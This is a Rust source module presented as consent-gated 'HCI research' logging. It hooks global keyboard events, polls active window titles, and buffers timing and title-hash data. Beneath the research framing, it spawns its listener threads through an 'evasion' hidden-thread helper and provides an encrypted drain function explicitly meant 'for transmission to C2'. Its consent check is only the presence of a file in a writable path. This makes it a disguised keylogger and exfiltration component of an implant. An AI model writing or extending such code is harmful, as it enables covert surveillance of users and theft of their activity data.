//! Optional Human-Computer Interaction (HCI) logging for research.
//!
//! This module provides capabilities for collecting anonymized interaction data,
//! such as active window titles and keyboard events. It is designed with

//! privacy safeguards and is strictly opt-in.
//!
//! **Warning:** This module must only be used with informed user consent and
//! in full compliance with all applicable privacy regulations (e.g., GDPR).
//! The data collected can be sensitive.

#![cfg(feature = "hci-research")]

use chrono::Utc;
use lazy_static::lazy_static;
use rdev::{listen, Event, EventType};
use serde::Serialize;
use std::collections::VecDeque;
use std::fs;
use std::hash::{Hash, Hasher};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;
use twox_hash::XxHash64;

const MAX_BUFFER_SIZE: usize = 10_000;
/// Events older than this many seconds are purged by `purge_expired_events()`.
const MAX_RETENTION_SECONDS: u64 = 86_400; // 24 hours

/// Window title substrings that indicate potentially sensitive context.
/// Events captured while these windows are active are dropped rather than
/// buffered, to avoid inadvertently recording authentication material.
const SENSITIVE_WINDOW_FILTERS: &[&str] = &[
    "password",
    "keepass",
    "1password",
    "lastpass",
    "bitwarden",
    "credential",
    "sign in",
    "login",
    "log in",
    "authenticate",
    "keychain",
    "wallet",
];

#[derive(Serialize, Clone, Debug)]
pub struct KeyEvent {
    timestamp: u64,
    pressed: bool,
}

#[derive(Serialize, Clone, Debug)]
pub struct WindowEvent {
    timestamp: u64,
    title_hash: u64,
}

#[derive(Serialize, Clone, Debug)]
pub enum HciEvent {
    Keyboard(KeyEvent),
    Window(WindowEvent),
}

lazy_static! {
    static ref CONSENT_FILE_PATH: Mutex<String> = Mutex::new(
        // Default to a user-level path consistent with remote_assist.rs:
        // prefer $HOME so no elevated privileges are needed.
        std::env::var("HOME")
            .map(|h| format!("{}/.orchestra-consent", h))
            .unwrap_or_else(|_| {
                #[cfg(target_os = "linux")]
                {
                    std::env::var("XDG_RUNTIME_DIR")
                        .map(|d| format!("{}/orchestra-consent", d))
                        .unwrap_or_else(|_| "/tmp/orchestra-consent".to_string())
                }
                #[cfg(not(target_os = "linux"))]
                {
                    "/tmp/orchestra-consent".to_string()
                }
            })
    );
    static ref HCI_LOG_BUFFER: Arc<Mutex<VecDeque<HciEvent>>> =
        Arc::new(Mutex::new(VecDeque::with_capacity(MAX_BUFFER_SIZE)));
    /// Gates event processing and controls the window-title polling thread.
    /// AtomicBool allows lock-free access from the rdev callback.
    static ref IS_LOGGING: Arc<AtomicBool> = Arc::new(AtomicBool::new(false));
    /// Prevents spawning more than one rdev listener thread.
    /// rdev::listen blocks indefinitely with no cancellation API; once started
    /// the thread runs for the process lifetime and we gate event delivery via
    /// IS_LOGGING instead of stopping and restarting the thread.
    static ref LISTENER_STARTED: AtomicBool = AtomicBool::new(false);
    /// Prevents accumulating window-title polling threads across repeated
    /// start/stop cycles.  The flag is cleared when the thread exits so that
    /// the next start_logging call can re-spawn it.
    static ref WINDOW_POLLER_STARTED: AtomicBool = AtomicBool::new(false);
}

#[cfg(target_os = "macos")]
lazy_static! {
    /// macOS-only guard to avoid spawning duplicate periodic event-tap health
    /// check threads across repeated start_logging() calls.
    static ref TAP_HEALTH_CHECK_STARTED: AtomicBool = AtomicBool::new(false);
}

#[cfg(target_os = "macos")]
const MACOS_TAP_PERMISSION_WARNING: &str = "hci_logging: CGEventTap creation failed — the application likely lacks Accessibility permissions. Enable it in System Preferences > Security & Privacy > Privacy > Accessibility.";

#[cfg(target_os = "macos")]
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum MacOsTapHealth {
    /// CGEventTapCreate returned NULL and the tap is therefore not enabled.
    /// This is typically a permissions-denied condition.
    CreationFailedDisabled,
    /// Event tap object exists but is disabled.
    Disabled,
    /// Event tap exists and is enabled.
    Enabled,
}

#[cfg(target_os = "macos")]
fn probe_macos_event_tap_health() -> MacOsTapHealth {
    use std::ffi::c_void;

    type CGEventTapProxy = *mut c_void;
    type CGEventType = u32;
    type CGEventRef = *mut c_void;
    type CFMachPortRef = *mut c_void;

    extern "C" {
        fn CGEventTapCreate(
            tap: u32,
            place: u32,
            options: u32,
            events_of_interest: u64,
            callback: extern "C" fn(
                CGEventTapProxy,
                CGEventType,
                CGEventRef,
                *mut c_void,
            ) -> CGEventRef,
            user_info: *mut c_void,
        ) -> CFMachPortRef;
        fn CGEventTapIsEnabled(tap: CFMachPortRef) -> u8;
        fn CFMachPortInvalidate(port: CFMachPortRef);
        fn CFRelease(cf: *const c_void);
    }

    extern "C" fn passthrough_callback(
        _proxy: CGEventTapProxy,
        _event_type: CGEventType,
        event: CGEventRef,
        _user_info: *mut c_void,
    ) -> CGEventRef {
        event
    }

    // kCGSessionEventTap=1, kCGHeadInsertEventTap=0,
    // kCGEventTapOptionListenOnly=1, keyDown(10)|keyUp(11).
    let event_mask = (1u64 << 10) | (1u64 << 11);
    let tap = unsafe {
        CGEventTapCreate(
            1,
            0,
            1,
            event_mask,
            passthrough_callback,
            std::ptr::null_mut(),
        )
    };

    let enabled = if tap.is_null() {
        false
    } else {
        unsafe { CGEventTapIsEnabled(tap) != 0 }
    };

    // Permission-denial path requested by Prompt 7-6: creation failed and
    // the tap is not enabled.
    if tap.is_null() && !enabled {
        return MacOsTapHealth::CreationFailedDisabled;
    }

    unsafe {
        CFMachPortInvalidate(tap);
        CFRelease(tap as *const c_void);
    }

    if enabled {
        MacOsTapHealth::Enabled
    } else {
        MacOsTapHealth::Disabled
    }
}

fn check_consent() -> bool {
    let path = CONSENT_FILE_PATH.lock().unwrap();
    fs::metadata(path.as_str()).is_ok()
}

/// Starts the HCI logging process.
pub fn start_logging() -> Result<(), String> {
    if !check_consent() {
        return Err("HCI research consent not found. Aborting.".to_string());
    }

    // Atomically transition false → true; fail if already logging.
    if IS_LOGGING
        .compare_exchange(false, true, Ordering::SeqCst, Ordering::SeqCst)
        .is_err()
    {
        return Err("Logging is already in progress.".to_string());
    }

    // Spawn the rdev listener thread at most once for the process lifetime.
    // rdev::listen has no cancellation API, so the thread cannot be cleanly
    // terminated; IS_LOGGING gates whether events are actually recorded.
    if !LISTENER_STARTED.swap(true, Ordering::SeqCst) {
        let logging_flag = Arc::clone(&IS_LOGGING);
        let buffer_handle = Arc::clone(&HCI_LOG_BUFFER);

        let callback = move |event: Event| {
            if !logging_flag.load(Ordering::Relaxed) {
                return;
            }
            let timestamp = Utc::now().timestamp_micros() as u64;
            match event.event_type {
                EventType::KeyPress(_) => {
                    add_log_event(
                        &buffer_handle,
                        HciEvent::Keyboard(KeyEvent {
                            timestamp,
                            pressed: true,
                        }),
                    );
                }
                EventType::KeyRelease(_) => {
                    add_log_event(
                        &buffer_handle,
                        HciEvent::Keyboard(KeyEvent {
                            timestamp,
                            pressed: false,
                        }),
                    );
                }
                _ => {}
            }
        };

        // M-31: On macOS, rdev::listen uses CGEventTap which requires the main
        // thread with an active CFRunLoop.  We dispatch the listener to the main
        // thread via a global channel and run it in the main thread's CFRunLoop.
        // On other platforms, spawn a background thread as before.
        #[cfg(target_os = "macos")]
        {
            // Check accessibility permissions before attempting to listen.
            // AXIsProcessTrusted() returns true if the app has Accessibility perms.
            // Without this, CGEventTapCreate silently returns NULL.
            let trusted = unsafe {
                extern "C" {
                    fn AXIsProcessTrusted() -> bool;
                }
                AXIsProcessTrusted()
            };
            if !trusted {
                log::warn!(
                    "hci_logging: macOS Accessibility permission is not granted. \
                     Key events may not be captured until this process is added in \
                     System Preferences -> Privacy & Security -> Accessibility."
                );
            }

            // Probe event-tap state up front to give operators actionable
            // feedback when key capture is unavailable due to permissions.
            match probe_macos_event_tap_health() {
                MacOsTapHealth::CreationFailedDisabled => {
                    log::warn!("{}", MACOS_TAP_PERMISSION_WARNING);
                    IS_LOGGING.store(false, Ordering::SeqCst);
                    LISTENER_STARTED.store(false, Ordering::SeqCst);
                    return Err(
                        "hci_logging: CGEventTap initialization failed due to missing macOS Accessibility permissions"
                            .to_string(),
                    );
                }
                MacOsTapHealth::Disabled => {
                    log::warn!(
                        "hci_logging: macOS CGEventTap is not enabled. \
                         Grant Accessibility permissions to this process in \
                         System Preferences -> Privacy & Security -> Accessibility \
                         to enable keylogging."
                    );
                }
                MacOsTapHealth::Enabled => {}
            }

            crate::evasion::spawn_hidden_thread(move || {
                // Ensure this thread has a CFRunLoop before starting rdev.
                // rdev on macOS expects a run loop to be active for CGEventTap
                // callbacks to be delivered.  The `listen` function internally
                // calls CFRunLoopRun() on macOS, so the call below ensures the
                // thread has a run loop object before rdev::listen registers
                // its CGEventTap.
                unsafe {
                    extern "C" {
                        fn CFRunLoopGetCurrent() -> *mut std::ffi::c_void;
                    }
                    let _rl = CFRunLoopGetCurrent();
                }

                if let Err(error) = listen(callback) {
                    tracing::error!(
                        "[hci-logging] rdev::listen failed on macOS: {:?}. \
                         This usually means Accessibility permissions are missing \
                         or CGEventTap creation failed.",
                        error
                    );
                    LISTENER_STARTED.store(false, Ordering::SeqCst);
                }
            });

            // Periodic health check: CGEventTap can be disabled at runtime if
            // Accessibility permissions are revoked while the process is alive.
            if !TAP_HEALTH_CHECK_STARTED.swap(true, Ordering::SeqCst) {
                crate::evasion::spawn_hidden_thread(move || {
                    let mut warned_disabled = false;
                    while LISTENER_STARTED.load(Ordering::Relaxed) {
                        if IS_LOGGING.load(Ordering::Relaxed) {
                            match probe_macos_event_tap_health() {
                                MacOsTapHealth::Enabled => {
                                    warned_disabled = false;
                                }
                                MacOsTapHealth::CreationFailedDisabled | MacOsTapHealth::Disabled => {
                                    if !warned_disabled {
                                        log::warn!(
                                            "hci_logging: macOS CGEventTap was disabled at runtime - \
                                             Accessibility permissions may have been revoked."
                                        );
                                        warned_disabled = true;
                                    }
                                }
                            }
                        }
                        thread::sleep(Duration::from_secs(60));
                    }
                    TAP_HEALTH_CHECK_STARTED.store(false, Ordering::SeqCst);
                });
            }
        }

        #[cfg(not(target_os = "macos"))]
        {
            crate::evasion::spawn_hidden_thread(move || {
                if let Err(error) = listen(callback) {
                    tracing::error!("[hci-logging] rdev::listen failed: {:?}", error);
                    LISTENER_STARTED.store(false, Ordering::SeqCst);
                }
            });
        }
    }

    // The window-title polling thread exits on its own when IS_LOGGING becomes
    // false.  Guard against accumulating threads across rapid start/stop cycles
    // with WINDOW_POLLER_STARTED; the thread clears the flag when it exits.
    if !WINDOW_POLLER_STARTED.swap(true, Ordering::SeqCst) {
        let logging_flag = Arc::clone(&IS_LOGGING);
        let buffer_handle_win = Arc::clone(&HCI_LOG_BUFFER);
        crate::evasion::spawn_hidden_thread(move || {
            // Debounce: track the last-logged title hash and skip duplicate
            // events.  Rapid window switching otherwise generates excessive
            // log entries for every 1-second poll tick.
            let mut last_logged_hash: Option<u64> = None;
            while logging_flag.load(Ordering::Relaxed) {
                if let Ok(title) = get_active_window_title() {
                    // 5.6: Suppress recording when active window is sensitive
                    // (password manager, sign-in dialog, etc.).
                    if is_sensitive_window(&title) {
                        thread::sleep(Duration::from_secs(1));
                        continue;
                    }
                    let timestamp = Utc::now().timestamp_micros() as u64;
                    let mut hasher = XxHash64::default();
                    title.hash(&mut hasher);
                    let title_hash = hasher.finish();
                    // Only log when the active window has actually changed.
                    if last_logged_hash != Some(title_hash) {
                        last_logged_hash = Some(title_hash);
                        add_log_event(
                            &buffer_handle_win,
                            HciEvent::Window(WindowEvent {
                                timestamp,
                                title_hash,
                            }),
                        );
                    }
                }
                thread::sleep(Duration::from_secs(1));
            }
            // Allow a subsequent start_logging call to spawn a fresh thread.
            WINDOW_POLLER_STARTED.store(false, Ordering::SeqCst);
        });
    }

    log::debug!("HCI logging started.");
    Ok(())
}

/// Stops the HCI logging process.
pub fn stop_logging() -> Result<(), String> {
    // Atomically transition true → false; fail if not logging.
    if IS_LOGGING
        .compare_exchange(true, false, Ordering::SeqCst, Ordering::SeqCst)
        .is_err()
    {
        return Err("Logging is not in progress.".to_string());
    }
    log::debug!("HCI logging stopped.");
    Ok(())
}

/// Retrieves the current HCI log buffer.
pub fn get_log_buffer() -> Result<Vec<HciEvent>, String> {
    let buffer = HCI_LOG_BUFFER.lock().unwrap();
    Ok(buffer.iter().cloned().collect())
}

/// Adds an event to the log buffer, enforcing size limits.
fn add_log_event(buffer_handle: &Arc<Mutex<VecDeque<HciEvent>>>, event: HciEvent) {
    let mut buffer = buffer_handle.lock().unwrap();
    if buffer.len() == MAX_BUFFER_SIZE {
        buffer.pop_front();
    }
    buffer.push_back(event);
}

/// Returns `true` when `cmd` is found as an executable file in any directory
/// listed in the `PATH` environment variable.  Used to avoid depending on the
/// `which` crate for a single binary-existence check.
#[cfg(target_os = "linux")]
fn command_available(cmd: &str) -> bool {
    let path_var = match std::env::var("PATH") {
        Ok(v) => v,
        Err(_) => return false,
    };
    path_var.split(':').any(|dir| {
        let p = std::path::Path::new(dir).join(cmd);
        p.is_file()
    })
}

#[cfg(target_os = "linux")]
fn get_active_window_title() -> Result<String, String> {
    use std::process::Command;

    // On a pure Wayland session (no X11 socket), xdotool cannot connect.
    // Try Wayland-native approaches first.
    let on_wayland = std::env::var_os("WAYLAND_DISPLAY").is_some();
    let on_x11 = std::env::var_os("DISPLAY").is_some();

    if on_wayland && !on_x11 {
        // GNOME Shell (mutter): query via gdbus.
        if let Ok(out) = Command::new("gdbus")
            .args([
                "call",
                "--session",
                "--dest",
                "org.gnome.Shell",
                "--object-path",
                "/org/gnome/Shell",
                "--method",
                "org.gnome.Shell.Eval",
                "global.display.focus_window?.title ?? ''",
            ])
            .output()
        {
            if out.status.success() {
                let raw = String::from_utf8_lossy(&out.stdout);
                // gdbus returns: (true, 'Window Title\n')
                if let Some(inner) = raw
                    .split('\'')
                    .nth(1)
                    .map(|s| s.trim_end_matches('\'').trim().to_string())
                {
                    if !inner.is_empty() {
                        return Ok(inner);
                    }
                }
            }
        }

        // KDE Plasma (kwin): use qdbus.
        if let Ok(out) = Command::new("qdbus")
            .args(["org.kde.KWin", "/KWin", "queryWindowInfo"])
            .output()
        {
            if out.status.success() {
                let raw = String::from_utf8_lossy(&out.stdout);
                // Output is a newline-separated "key: value" list; find caption.
                for line in raw.lines() {
                    if let Some(rest) = line.strip_prefix("caption: ") {
                        let title = rest.trim().to_string();
                        if !title.is_empty() {
                            return Ok(title);
                        }
                    }
                }
            }
        }

        // No Wayland compositor interface was reachable.
        return Err("Wayland session detected but no compositor IPC is available (tried gdbus/qdbus)".to_string());
    }

    // X11 path: use xdotool if available.
    if !on_x11 {
        return Err("No display available (DISPLAY and WAYLAND_DISPLAY are both unset)".to_string());
    }

    // Check that xdotool is installed before attempting to call it.
    if !command_available("xdotool") {
        return Err("xdotool not found on PATH; install it to enable X11 window-title tracking".to_string());
    }

    // Use a thread-based timeout so we don't depend on the GNU `timeout`
    // command.  If xdotool hangs (e.g. broken X server), the thread is
    // abandoned after 2 s and we return a neutral error.
    let (tx, rx) = std::sync::mpsc::channel();
    std::thread::spawn(move || {
        let result = Command::new("xdotool")
            .args(["getactivewindow", "getwindowname"])
            .output();
        let _ = tx.send(result);
    });

    match rx.recv_timeout(std::time::Duration::from_secs(2)) {
        Ok(Ok(output)) if output.status.success() => {
            Ok(String::from_utf8_lossy(&output.stdout).trim().to_string())
        }
        Ok(Ok(output)) => Err(String::from_utf8_lossy(&output.stderr).to_string()),
        Ok(Err(e)) => Err(e.to_string()),
        Err(_) => Err("xdotool timed out after 2 s".to_string()),
    }
}

#[cfg(target_os = "windows")]
fn get_active_window_title() -> Result<String, String> {
    use std::ffi::OsString;
    use std::os::windows::ffi::OsStringExt;
    use winapi::um::winuser::{GetForegroundWindow, GetWindowTextW};

    let hwnd = unsafe { GetForegroundWindow() };
    if hwnd.is_null() {
        return Err("No foreground window found".to_string());
    }

    let mut buffer: [u16; 256] = [0; 256];
    let len = unsafe { GetWindowTextW(hwnd, buffer.as_mut_ptr(), buffer.len() as i32) };

    if len > 0 {
        Ok(OsString::from_wide(&buffer[..len as usize])
            .to_string_lossy()
            .into_owned())
    } else {
        Err("Could not get window title".to_string())
    }
}

#[cfg(target_os = "macos")]
fn get_active_window_title() -> Result<String, String> {
    use std::process::Command;
    // Use AppleScript via `osascript` to retrieve the frontmost application
    // name.  This requires no additional crate dependencies and works on all
    // modern macOS versions without accessibility permissions.
    let output = Command::new("osascript")
        .args([
            "-e",
            "tell application \"System Events\" to get name of first process whose frontmost is true",
        ])
        .output()
        .map_err(|e| e.to_string())?;
    if output.status.success() {
        Ok(String::from_utf8_lossy(&output.stdout).trim().to_string())
    } else {
        Err(String::from_utf8_lossy(&output.stderr).to_string())
    }
}

#[cfg(not(any(target_os = "linux", target_os = "windows", target_os = "macos")))]
fn get_active_window_title() -> Result<String, String> {
    Err("Active window title not supported on this platform".to_string())
}

// ── 5.6: Retention policy ─────────────────────────────────────────────────────

/// Remove all events from the buffer whose timestamp is older than
/// `MAX_RETENTION_SECONDS`.  Call periodically (e.g., once per flush cycle)
/// to bound memory usage over long-running sessions.
pub fn purge_expired_events() {
    let cutoff =
        (Utc::now().timestamp_micros() as u64).saturating_sub(MAX_RETENTION_SECONDS * 1_000_000);
    let mut buf = HCI_LOG_BUFFER.lock().unwrap();
    buf.retain(|ev| {
        let ts = match ev {
            HciEvent::Keyboard(k) => k.timestamp,
            HciEvent::Window(w) => w.timestamp,
        };
        ts >= cutoff
    });
}

// ── 5.6: Search / sensitive window filtering ─────────────────────────────────

/// Returns `true` when `title` matches one of the sensitive-context filters
/// and buffering of HCI events should be suppressed.
pub fn is_sensitive_window(title: &str) -> bool {
    let lower = title.to_lowercase();
    SENSITIVE_WINDOW_FILTERS.iter().any(|kw| lower.contains(kw))
}

// ── 5.6: Encrypted exfiltration drain ────────────────────────────────────────

/// Serialise and encrypt the current event buffer for transmission to C2.
///
/// Returns the encrypted bytes (ChaCha20-Poly1305 with a one-shot nonce) and
/// clears the in-memory buffer.  Returns `None` when the buffer is empty.
///
/// The caller is responsible for actually sending the ciphertext — this
/// function only handles serialisation, encryption, and buffer draining.
pub fn drain_encrypted_for_c2(key: &[u8; 32]) -> Option<Vec<u8>> {
    use chacha20poly1305::{
        aead::{Aead, KeyInit},
        ChaCha20Poly1305, Nonce,
    };
    let events: Vec<HciEvent> = {
        let mut buf = HCI_LOG_BUFFER.lock().unwrap();
        if buf.is_empty() {
            return None;
        }
        buf.drain(..).collect()
    };
    let plaintext = match serde_json::to_vec(&events) {
        Ok(v) => v,
        Err(e) => {
            log::error!("hci_logging: serialisation failed: {}", e);
            return None;
        }
    };
    let cipher = ChaCha20Poly1305::new(key.into());
    // Use a random 12-byte nonce and prepend it to the ciphertext so the
    // receiver can reconstruct the nonce without out-of-band signalling.
    let nonce_bytes: [u8; 12] = rand::random();
    let nonce = Nonce::from_slice(&nonce_bytes);
    match cipher.encrypt(nonce, plaintext.as_slice()) {
        Ok(mut ct) => {
            let mut out = nonce_bytes.to_vec();
            out.append(&mut ct);
            Some(out)
        }
        Err(e) => {
            log::error!("hci_logging: encryption failed: {}", e);
            None
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use rdev::{simulate, Key};
    use std::path::Path;
    use tempfile::tempdir;

    // Helper to create the consent file for testing
    fn create_consent_file(path: &Path) {
        fs::write(path, "consent").unwrap();
    }

    // Helper to remove the consent file after testing
    fn remove_consent_file(path: &Path) {
        let _ = fs::remove_file(path);
    }

    #[tokio::test]
    async fn test_start_stop_logging() {
        let dir = tempdir().unwrap();
        let consent_file = dir.path().join("orchestra-consent");
        let original_path = {
            let mut path_guard = CONSENT_FILE_PATH.lock().unwrap();
            let original = path_guard.clone();
            *path_guard = consent_file.to_str().unwrap().to_string();
            original
        };

        create_consent_file(&consent_file);
        if let Err(e) = start_logging() {
            println!("Could not start logging, skipping test: {}", e);
            // Restore original path
            *CONSENT_FILE_PATH.lock().unwrap() = original_path;
            return;
        }
        assert!(start_logging().is_err()); // Already running
        assert!(stop_logging().is_ok());
        assert!(stop_logging().is_err()); // Already stopped
        remove_consent_file(&consent_file);
        assert!(start_logging().is_err()); // No consent

        // Restore original path
        *CONSENT_FILE_PATH.lock().unwrap() = original_path;
    }

    #[tokio::test]
    async fn test_event_collection() {
        let dir = tempdir().unwrap();
        let consent_file = dir.path().join("orchestra-consent");
        let original_path = {
            let mut path_guard = CONSENT_FILE_PATH.lock().unwrap();
            let original = path_guard.clone();
            *path_guard = consent_file.to_str().unwrap().to_string();
            original
        };

        create_consent_file(&consent_file);
        // Clear buffer from previous runs
        HCI_LOG_BUFFER.lock().unwrap().clear();

        if let Err(e) = start_logging() {
            println!("Could not start logging, skipping test: {}", e);
            // Restore original path
            *CONSENT_FILE_PATH.lock().unwrap() = original_path;
            return;
        }

        // Allow some time for the logger to initialize
        tokio::time::sleep(Duration::from_millis(100)).await;

        // Simulate a key press and release
        if simulate(&EventType::KeyPress(Key::KeyA)).is_ok() {
            tokio::time::sleep(Duration::from_millis(50)).await;
            if simulate(&EventType::KeyRelease(Key::KeyA)).is_err() {
                println!("Could not simulate key release.");
            }
        } else {
            println!("Could not simulate key press. Input simulation may not be available in this environment.");
        }

        // Allow time for window title polling
        tokio::time::sleep(Duration::from_secs(2)).await;

        stop_logging().unwrap();

        let buffer = get_log_buffer().unwrap();

        // We expect at least 1 window event if xdotool is available.
        let xdotool_available = std::process::Command::new("xdotool")
            .arg("--version")
            .output()
            .is_ok();
        if xdotool_available {
            let window_events_found = buffer
                .iter()
                .filter(|e| matches!(e, HciEvent::Window(_)))
                .count();
            assert!(
                window_events_found >= 1,
                "No window events found, but xdotool seems to be available."
            );
        } else {
            println!("xdotool not found, skipping window event check.");
        }

        // Restore original path
        *CONSENT_FILE_PATH.lock().unwrap() = original_path;
    }

    #[test]
    fn test_log_buffer_size_limit() {
        let buffer_handle = Arc::new(Mutex::new(VecDeque::with_capacity(MAX_BUFFER_SIZE)));
        for i in 0..(MAX_BUFFER_SIZE + 10) {
            add_log_event(
                &buffer_handle,
                HciEvent::Keyboard(KeyEvent {
                    timestamp: i as u64,
                    pressed: true,
                }),
            );
        }
        let buffer = buffer_handle.lock().unwrap();
        assert_eq!(buffer.len(), MAX_BUFFER_SIZE);
    }
}
